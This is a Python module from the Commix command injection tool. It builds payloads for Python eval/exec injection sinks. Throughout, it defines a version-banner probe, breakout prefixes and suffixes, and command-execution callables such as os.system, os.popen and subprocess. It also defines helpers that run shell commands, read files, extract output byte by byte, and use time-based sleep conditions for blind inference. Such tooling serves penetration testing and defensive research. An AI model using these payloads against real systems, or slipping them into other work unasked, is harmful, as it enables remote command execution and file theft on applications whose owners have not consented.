#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

NAME = "python"

# The same name as it is written out to the user, where the switch's own spelling would read wrong.
LABEL = "Python"

"""
An expression whose value says at once that code was evaluated, and which version evaluated it.

The interpreter's own version banner, which no payload carries and no reflection can produce - the
build and compiler it names are written by the interpreter, so seeing them back is the proof.
"""
PROBE = "__import__(\"sys\").version"

"""
The probe on its own, and wrapped in what would render it where the bare value is not.

An evaluation sink here is reached as an expression, and what the application does with the value
is its own business - so the probe is offered as the value, and as a string where the value alone
would not be rendered.
"""
PROBE_FUNCTIONS = ["" + PROBE + "",
  "str(" + PROBE + ")",
  "repr(" + PROBE + ")"
]

# The same probes broken into the string being evaluated, one boundary per row - each row pairing a
# prefix with the suffix that closes it, the way the boundaries below are paired.
PROBE_PAYLOADS = [
  [x for x in PROBE_FUNCTIONS],
  ["+" + x for x in PROBE_FUNCTIONS],
  ["'+" + x + "+'" for x in PROBE_FUNCTIONS],
  ["\"+" + x + "+\"" for x in PROBE_FUNCTIONS],
  ["')+" + x + "+('" for x in PROBE_FUNCTIONS]
]

PROBE_PAYLOADS = [x for payload in PROBE_PAYLOADS for x in payload]

"""
What the probe's own value looks like coming back, and the complaints that say a payload reached an
evaluated string even where nothing was rendered.

The version is followed by the build and the compiler, both in brackets - a shape the payload does
not contain, so a target that merely echoes the payload back cannot match it.
"""
PROBE_REGEX = r"(\d+\.\d+\.\d+[^\s\]]*)\s*\([^)]*\)\s*\[[^\]]+\]"
WARNINGS = ["File \"<string>\"", "Traceback (most recent call last)", "SyntaxError",
            "NameError", "eval() arg", "exec() arg"]

"""
The language's own callables that run a command, widest first as the level rises.

Each is written out whole, the import included: there is no bare name for these the way a language
with them built in would have, and the prefix below only adds the bracket.
"""
EXECUTION_FUNCTIONS_LVL1 = ["__import__(\"os\").system"]
EXECUTION_FUNCTIONS_LVL2 = EXECUTION_FUNCTIONS_LVL1 + ["__import__(\"os\").popen"]
EXECUTION_FUNCTIONS_LVL3 = EXECUTION_FUNCTIONS_LVL2 + ["__import__(\"subprocess\").getoutput",
                                                      "__import__(\"subprocess\").call",
                                                      "eval", "exec"]

# Breaking out of the evaluated string, and closing it again behind the payload.
SEPARATORS_LVL1 = [""]
SEPARATORS_LVL2 = SEPARATORS_LVL1 + ["\n"]
SEPARATORS_LVL3 = SEPARATORS_LVL2 + ["\r\n"]

# The whole value as the expression, concatenation onto a value that is already one, and
# concatenation out of a quoted string the value sits inside.
PREFIXES_LVL1 = ["", "+", "'+", "\"+"]
# Closing a call the value sits inside, and a further argument to one.
PREFIXES_LVL2 = PREFIXES_LVL1 + ["')+", "\")+", "',", "\","]
# Ending the statement outright, where the sink runs statements rather than an expression.
PREFIXES_LVL3 = PREFIXES_LVL2 + ["';", "\";", ";", ")", "']", "\"]", "'}", "\"}"]

SUFFIXES_LVL1 = ["", "+'", "+\""]
# Closing the call again, and commenting out whatever the application appends behind it.
SUFFIXES_LVL2 = SUFFIXES_LVL1 + ["+('", "+(\"", "#"]
SUFFIXES_LVL3 = SUFFIXES_LVL2 + ["'#", "\"#", ")#", "]#", "}#", ",'", ",\""]

# How one of the functions above is reached, as a prefix a payload is wrapped in.
def execution_prefix(function):
  return function + "("

"""
Wrap the shell commands a payload runs in what this language renders them with.

There is no statement here that writes to the response the way another language's print does: what
the application renders is the value of the expression it evaluated, so the commands' output is
concatenated and handed back as that value.
"""
def print_statement(separator, commands, chain=None):
  if separator == "":
    return "+".join(run(command) for command in commands)
  return run((chain or separator).join(commands))

"""
The expressions every payload is built out of, spelled the way this language spells them.

What a technique asks of a sink is the same whichever language is evaluating: run this, tell me how
long the answer is, tell me its Nth byte, wait this long if the answer is yes. Only the spelling
differs - so the techniques ask through the names below, and a language is added by writing them
again rather than by touching a payload.

The strings here are quoted with '"', which leaves the boundaries that break out of a single-quoted
string usable and the ones breaking out of a double-quoted string not - the same trade the language
itself imposes, and the sweep simply finds fewer combinations that work on such a target.
"""

"""
A string literal holding the given text.

Whatever is quoted here can itself contain a quote - an interpreter one-liner passed with
'--interpreter' is full of them, and so is any command the user wrote with one. Left as they are,
the first of them ends the literal and the rest is read as code that does not parse.
"""
def _literal(text):
  return "\"" + text.replace("\\", "\\\\").replace("\"", "\\\"") + "\""

# Run a command and yield its output.
def run(cmd):
  return "__import__(\"os\").popen(" + _literal(cmd) + ").read()"

# Read a file and yield its contents.
def read_file(path):
  return "open(" + _literal(path) + ").read()"

# Drop trailing whitespace, so a length agrees with what a shell's own substitution would report.
def trim(expr):
  return "(" + expr + ").rstrip()"

# How many bytes an expression is.
def length(expr):
  return "len(" + expr + ")"

"""
The ordinal of an expression's Nth byte, counting from zero.

Sliced rather than indexed, and given something to fall back on: an index past the end raises here
where another language answers zero, and the search asks about bytes that may not be there.
"""
def ordinal(expr, index):
  return "ord((" + expr + ")[" + str(index) + ":" + str(index + 1) + "] or chr(0))"

# An expression's value read as a number, for a command whose output is one.
def to_number(expr):
  return "int((" + expr + ") or 0)"

# Wait for as long as the condition is true, and no time at all when it is false.
def delay(timesec, condition):
  return "__import__(\"time\").sleep(" + str(timesec) + "*(" + condition + "))"

"""
Evaluate one expression and then another, within a single expression.

A tuple, whose elements are evaluated left to right, with the second one's value taken - there is
no operator here that both sequences and yields the way another language's concatenation does.
"""
def sequence(first, second):
  return "(" + first + "," + second + ")[1]"

# What ends a statement, where the boundary being tested can carry one.
TERMINATOR = ";"

# eof
